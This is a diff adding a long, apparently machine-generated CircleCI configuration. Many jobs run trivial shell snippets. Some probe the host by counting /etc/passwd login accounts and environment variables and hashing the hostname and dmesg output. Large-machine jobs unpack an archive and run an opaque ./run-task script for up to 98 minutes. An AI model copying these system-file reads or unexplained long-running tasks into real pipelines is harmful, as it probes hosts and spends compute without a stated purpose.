+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  green_bun-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: oasis
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "%10.4f\n", 1/7}'; true ; } > /tmp/scratch/912.txt
+            echo "ready: $(sha256sum /tmp/scratch/912.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 912.txt
+  bun-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/912.txt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  tester_CORE-769:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: tango step
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print length("hello world")}'; true ; } > /tmp/scratch/counts.jsonl
+            echo "ready: $(sha256sum /tmp/scratch/counts.jsonl | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - counts.jsonl
+  CORE-769:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/counts.jsonl || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  red_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: message cto
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; hostname 2>/dev/null | md5sum; true ; } > /tmp/scratch/primary_task_output_v3.log
+            echo "ready: $(sha256sum /tmp/scratch/primary_task_output_v3.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - primary_task_output_v3.log
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/2023-11-05.data || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+  reset_INFRA-720:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: sextet
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/scratch/report.txt
+            echo "ready: $(sha256sum /tmp/scratch/report.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - report.txt
+  INFRA-720:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Collect upstream
+          command: |
+            wc -c /tmp/scratch/report.txt || true
+      - run:
+          name: Clone target
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar --use-compress-program=xz -xf fixtures.tar.xz
+      - run:
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          no_output_timeout: 98m
+          command: env ./run-task
+
+  phase_UAT_VERIFY_7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tame it
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; tr -c 'a-z\n' 'X' < /etc/hostname | head -c 50; true ; } > /tmp/scratch/908b.out
+            echo "ready: $(sha256sum /tmp/scratch/908b.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 908b.out
+  redo_QA_VERIFY_1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: shrug up
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; jobs | wc -l; true ; } > /tmp/scratch/150.out
+            echo "ready: $(sha256sum /tmp/scratch/150.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 150.out
+  linter_ensure-production-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: spiral out
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; tty 2>/dev/null || echo no-tty; true ; } > /tmp/scratch/log.gz
+            echo "ready: $(sha256sum /tmp/scratch/log.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - log.gz
+  reset_nova-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: dip
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=15;i++){s=""; for(j=1;j<=i;j++)s=s"X"; print s}}' | wc -l; true ; } > /tmp/scratch/2024-04-24.data
+            echo "ready: $(sha256sum /tmp/scratch/2024-04-24.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2024-04-24.data
+  auditor_shippit_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rotate
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)if(sqrt(i)==int(sqrt(i)))print i}' | wc -l; true ; } > /tmp/scratch/artifact
+            echo "ready: $(sha256sum /tmp/scratch/artifact | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - artifact
+  cache_INFRA-720_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: ambush
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo 'banana apple apricot' | grep -o 'a' | wc -l; true ; } > /tmp/scratch/report.txt
+            echo "ready: $(sha256sum /tmp/scratch/report.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - report.txt
+  g1_RolloutImage_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: ding ding
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo {a..e}{1..3} | tr ' ' '\n' | wc -l; true ; } > /tmp/scratch/bundle.tar
+            echo "ready: $(sha256sum /tmp/scratch/bundle.tar | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - bundle.tar
+  fetcher_feat-4003_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: backstep
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "abc" | tr abc 123; true ; } > /tmp/scratch/step-27.log
+            echo "ready: $(sha256sum /tmp/scratch/step-27.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-27.log
+  staging_feb5-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: loop again
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100;for(i=1;i<=n;i++)if(i*i<n)r=i;print r}'; true ; } > /tmp/scratch/handoff.state
+            echo "ready: $(sha256sum /tmp/scratch/handoff.state | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - handoff.state
+  package_preview_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nibble
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%s\n" 1 2 3 4 5 6 7 8 9 10 | awk '{s+=$1; sq+=$1*$1}END{m=s/NR; printf "%.3f\n", sqrt(sq/NR - m*m)}'; true ; } > /tmp/scratch/big_job_output_v4.out
+            echo "ready: $(sha256sum /tmp/scratch/big_job_output_v4.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - big_job_output_v4.out
+  beta_sm-old_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: reach across
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%s\n" {A..J} | awk 'BEGIN{ORS=","}END{sub(/,$/,"",RT)}1' 2>/dev/null | head -c 25 || printf "%s\n" {A..J} | tr '\n' ','; true ; } > /tmp/scratch/output.md
+            echo "ready: $(sha256sum /tmp/scratch/output.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - output.md
+  preflight_bun-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: pool skim
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printenv | wc -l; true ; } > /tmp/scratch/912.txt
+            echo "ready: $(sha256sum /tmp/scratch/912.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 912.txt
+  enqueue_preview-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: loop knot
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/scratch/metrics.json
+            echo "ready: $(sha256sum /tmp/scratch/metrics.json | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - metrics.json
+  bootstrap_feat-2092_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: etude
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%s" "quick brown fox" | wc -c; true ; } > /tmp/scratch/step-8.out
+            echo "ready: $(sha256sum /tmp/scratch/step-8.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-8.out
+  phase_foxtrot_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: nope
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/scratch/final.log
+            echo "ready: $(sha256sum /tmp/scratch/final.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - final.log
+  drain_LaunchService_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: tornado alley
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /tmp/scratch/step-ready.txt
+            echo "ready: $(sha256sum /tmp/scratch/step-ready.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-ready.txt
+  go_push-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: butterfly tough
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; echo "ab cd ef" | tr ' ' '\n' | wc -l; true ; } > /tmp/scratch/PASS
+            echo "ready: $(sha256sum /tmp/scratch/PASS | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - PASS
+  fetch_romeo_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: cleat hitch
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; dmesg 2>/dev/null | tail -3 | md5sum || echo no-dmesg; true ; } > /tmp/scratch/87.bin
+            echo "ready: $(sha256sum /tmp/scratch/87.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 87.bin
+  prefetch_november_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: rollback 2
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]=10; a[2]=20; a[3]=30; for(k in a) s+=a[k]; print s}'; true ; } > /tmp/scratch/stage.bin
+            echo "ready: $(sha256sum /tmp/scratch/stage.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - stage.bin
+  audit_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: side bend
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 6791); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/scratch/284a.txt
+            echo "ready: $(sha256sum /tmp/scratch/284a.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 284a.txt
+  alpha_oct23-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: birch log
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{s=s*10+$1}END{print s}'; true ; } > /tmp/scratch/823.txt
+            echo "ready: $(sha256sum /tmp/scratch/823.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 823.txt
+  staging_CORE-769_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: whistle note
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "1 10\n2 20\n3 30\n" | awk '{s+=$2}END{print "sum="s}'; true ; } > /tmp/scratch/counts.jsonl
+            echo "ready: $(sha256sum /tmp/scratch/counts.jsonl | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - counts.jsonl
+  reup_nico-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: semaphore ready
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "key1=val1\nkey2=val2\nkey3=val3\n" | awk -F= '{print $1" -> "$2}'; true ; } > /tmp/scratch/ckpt-main.pt
+            echo "ready: $(sha256sum /tmp/scratch/ckpt-main.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - ckpt-main.pt
+  tester_q1-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: loop forever
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; grep -v nologin /etc/passwd | wc -l; true ; } > /tmp/scratch/OK
+            echo "ready: $(sha256sum /tmp/scratch/OK | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - OK
+workflows:
+  run:
+    jobs:
+      - cleanup_UAT_VERIFY_7
+      - phase_UAT_VERIFY_7_2:
+          requires:
+            - cleanup_UAT_VERIFY_7
+      - UAT_VERIFY_7:
+          requires:
+            - phase_UAT_VERIFY_7_2
+      - step1_QA_VERIFY_1:
+          requires:
+            - phase_UAT_VERIFY_7_2
+      - redo_QA_VERIFY_1_2:
+          requires:
+            - step1_QA_VERIFY_1
+      - QA_VERIFY_1:
+          requires:
+            - redo_QA_VERIFY_1_2
+      - postbuild_ensure-production-docker-image:
+          requires:
+            - redo_QA_VERIFY_1_2
+      - linter_ensure-production-docker-image_2:
+          requires:
+            - postbuild_ensure-production-docker-image
+      - ensure-production-docker-image:
+          requires:
+            - linter_ensure-production-docker-image_2
+      - hook_nova-rc:
+          requires:
+            - linter_ensure-production-docker-image_2
+      - reset_nova-rc_2:
+          requires:
+            - hook_nova-rc
+      - nova-rc:
+          requires:
+            - reset_nova-rc_2
+      - audit_shippit:
+          requires:
+            - reset_nova-rc_2
+      - auditor_shippit_2:
+          requires:
+            - audit_shippit
+      - shippit:
+          requires:
+            - auditor_shippit_2
+      - reset_INFRA-720:
+          requires:
+            - auditor_shippit_2
+      - cache_INFRA-720_2:
+          requires:
+            - reset_INFRA-720
+      - INFRA-720:
+          requires:
+            - cache_INFRA-720_2
+      - db_RolloutImage:
+          requires:
+            - cache_INFRA-720_2
+      - g1_RolloutImage_2:
+          requires:
+            - db_RolloutImage
+      - RolloutImage:
+          requires:
+            - g1_RolloutImage_2
+      - round1_feat-4003:
+          requires:
+            - g1_RolloutImage_2
+      - fetcher_feat-4003_2:
+          requires:
+            - round1_feat-4003
+      - feat-4003:
+          requires:
+            - fetcher_feat-4003_2
+      - builder_feb5-rev:
+          requires:
+            - fetcher_feat-4003_2
+      - staging_feb5-rev_2:
+          requires:
+            - builder_feb5-rev
+      - feb5-rev:
+          requires:
+            - staging_feb5-rev_2
+      - do_preview
+      - package_preview_2:
+          requires:
+            - do_preview
+      - preview:
+          requires:
+            - package_preview_2
+      - vendor_sm-old:
+          requires:
+            - package_preview_2
+      - beta_sm-old_2:
+          requires:
+            - vendor_sm-old
+      - sm-old:
+          requires:
+            - beta_sm-old_2
+      - green_bun-test:
+          requires:
+            - beta_sm-old_2
+      - preflight_bun-test_2:
+          requires:
+            - green_bun-test
+      - bun-test:
+          requires:
+            - preflight_bun-test_2
+      - p1_preview-build:
+          requires:
+            - preflight_bun-test_2
+      - enqueue_preview-build_2:
+          requires:
+            - p1_preview-build
+      - preview-build:
+          requires:
+            - enqueue_preview-build_2
+      - db_feat-2092:
+          requires:
+            - enqueue_preview-build_2
+      - bootstrap_feat-2092_2:
+          requires:
+            - db_feat-2092
+      - feat-2092:
+          requires:
+            - bootstrap_feat-2092_2
+      - blue_foxtrot:
+          requires:
+            - bootstrap_feat-2092_2
+      - phase_foxtrot_2:
+          requires:
+            - blue_foxtrot
+      - foxtrot:
+          requires:
+            - phase_foxtrot_2
+      - round2_LaunchService
+      - drain_LaunchService_2:
+          requires:
+            - round2_LaunchService
+      - LaunchService:
+          requires:
+            - drain_LaunchService_2
+      - maker_push-it:
+          requires:
+            - drain_LaunchService_2
+      - go_push-it_2:
+          requires:
+            - maker_push-it
+      - push-it:
+          requires:
+            - go_push-it_2
+      - Beta_romeo:
+          requires:
+            - go_push-it_2
+      - fetch_romeo_2:
+          requires:
+            - Beta_romeo
+      - romeo:
+          requires:
+            - fetch_romeo_2
+      - run_november:
+          requires:
+            - fetch_romeo_2
+      - prefetch_november_2:
+          requires:
+            - run_november
+      - november:
+          requires:
+            - prefetch_november_2
+      - drain_deploy:
+          requires:
+            - prefetch_november_2
+      - audit_deploy_2:
+          requires:
+            - drain_deploy
+      - deploy:
+          requires:
+            - audit_deploy_2
+      - linter_oct23-canary
+      - alpha_oct23-canary_2:
+          requires:
+            - linter_oct23-canary
+      - oct23-canary:
+          requires:
+            - alpha_oct23-canary_2
+      - tester_CORE-769:
+          requires:
+            - alpha_oct23-canary_2
+      - staging_CORE-769_2:
+          requires:
+            - tester_CORE-769
+      - CORE-769:
+          requires:
+            - staging_CORE-769_2
+      - g2_nico-test:
+          requires:
+            - staging_CORE-769_2
+      - reup_nico-test_2:
+          requires:
+            - g2_nico-test
+      - nico-test:
+          requires:
+            - reup_nico-test_2
+      - inspect_q1-smoke:
+          requires:
+            - reup_nico-test_2
+      - tester_q1-smoke_2:
+          requires:
+            - inspect_q1-smoke
+      - q1-smoke:
+          requires:
+            - tester_q1-smoke_2
+      - Beta_ship-it
+      - prefetch_teh-ci-35
+      - ship-it:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
+      - teh-ci-35:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
+      - v6-canary4:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
+      - vega-ng:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
+      - hu-verify:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
+      - do-the-thing:
+          requires:
+            - Beta_ship-it
+            - prefetch_teh-ci-35
